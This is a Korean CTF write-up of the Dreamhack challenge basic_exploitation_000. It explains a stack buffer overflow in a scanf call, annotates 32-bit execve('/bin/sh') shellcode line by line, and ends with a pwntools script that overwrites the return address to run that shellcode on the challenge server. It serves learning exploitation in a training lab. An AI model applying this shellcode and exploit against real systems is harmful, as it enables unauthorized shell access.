# [Dreamhack] basic_exploitation_000(SBO)

---

![Untitled](./[Dreamhack]_basic_exploitation_000(SBO).assets/Untitled.png)

### 문제 소스 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}

```

### 1. 취약점 분석

- `char buf[0x80];` buf의 크기는 0x80(128byte)인데, `scanf("%141s", buf);` scanf의 입력은 141byte의 입력을 받는 것을 확인할 수 있음
- 이를 통해 buffer Over flow가 발생할 수 있고 이를 이용해서 Flag를 획득 할 수 있음

### 2. 디버깅 시작

![Untitled](./[Dreamhack]_basic_exploitation_000(SBO).assets/Untitled%201.png)

- `main` 함수에 `breakpoint` 를 설정하고 해당 어셈블리코드를 살펴봄
- `main` 함수가 시작 될 때, `push ebp` 를 통해서 함수에 스택프레임을 할당하는 것을 확인할 수 있음
- 따라서, 현재 스택 구조는 다음과 같이 구성되어, `buf` 가 할당이 됨

![Untitled](./[Dreamhack]_basic_exploitation_000(SBO).assets/Untitled%202.png)

### 3. 익스플로잇

![Untitled](./[Dreamhack]_basic_exploitation_000(SBO).assets/Untitled%203.png)

- `buf` 에다가 쉘코드를 입력하고, `Return Address` 를 해당 변수로 설정을 해준다면, 해당 쉘코드가 동작하게 되고 `/bin/sh` 를 획득 할 수 있음
- 쉘 코드를 어셈블리코드로 작성하면 다음과 같음
    - **`\x31\xc0`** : `xor eax, eax`
        - `eax` 레지스터를 0으로 설정합니다.
    - **`\x50`** : `push eax`
        - 스택에 `eax`를 푸시합니다. 여기서는 NULL 바이트를 푸시합니다.
    - **`\x68\x6e\x2f\x73\x68`** : `push 0x68732f6e`
        - 스택에 `0x68732f6e`를 푸시합니다. 이는 "n/sh" 문자열을 나타냅니다.
    - **`\x68\x2f\x2f\x62\x69`** : `push 0x69622f2f`
        - 스택에 `0x69622f2f`를 푸시합니다. 이는 "//bi" 문자열을 나타냅니다.
    - **`\x89\xe3`** : `mov ebx, esp`
        - `ebx` 레지스터에 현재 스택 포인터 값을 설정합니다. 결과적으로 `ebx`는 "/bin/sh" 문자열을 가리킵니다.
    - **`\x31\xc9`** : `xor ecx, ecx`
        - `ecx` 레지스터를 0으로 설정합니다. 이는 `argv` 배열의 끝을 나타내는 NULL 포인터로 사용됩니다.
    - **`\x31\xd2`** : `xor edx, edx`
        - `edx` 레지스터를 0으로 설정합니다. 이는 `envp` 배열의 끝을 나타내는 NULL 포인터로 사용됩니다.
    - **`\xb0\x08`** : `mov al, 0x08`
        - `al` 레지스터에 8을 설정합니다.
    - **`\x40\x40\x40`** : `inc eax; inc eax; inc eax`
        - `eax` 레지스터를 세 번 증가시킵니다. 최종적으로 `eax`는 11 (`0xb`)이 됩니다. 이는 `execve` 시스템 호출 번호입니다.
    - **`\xcd\x80`** : `int 0x80`
        - 시스템 호출 인터럽트를 발생시킵니다.
- **시스템 호출 번호 설정**: `eax`를 8로 설정하고 세 번 증가시켜 11 (`execve`)로 만듭니다.
- **시스템 호출 실행**: `int 0x80` 인터럽트를 사용하여 시스템 호출을 실행합니다.

```c
; File name: shellcode.asm
section .text
global _start
_start:
xor    eax, eax
push   eax
push   0x68732f6e              ; Push "n/sh" (reversed)
push   0x69622f2f              ; Push "//bi" (reversed)
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al, 0x8
inc    eax
inc    eax
inc    eax
int    0x80
```

- 해당 코드를 byte code로 변환하여 저장

```c
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80
```

### 4. Python 익스플로잇 코드 작성

- 익스플로잇 코드를 작성해보면 다음과 같음

```python
from pwn import *

context.arch="i386"
p = remote('host3.dreamhack.games', 19424)
p.recvuntil("buf = (")
buf_address=int(p.recv(10), 16) # 수신한 문자열을 16진수로 변환하여 정수로 저장

payload=b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
payload+=b'A'*(0x80-len(payload))
payload+=b'B'*(0x4)
payload+=p32(buf_address)
# print(payload)
p.send(payload)
p.interactive()

```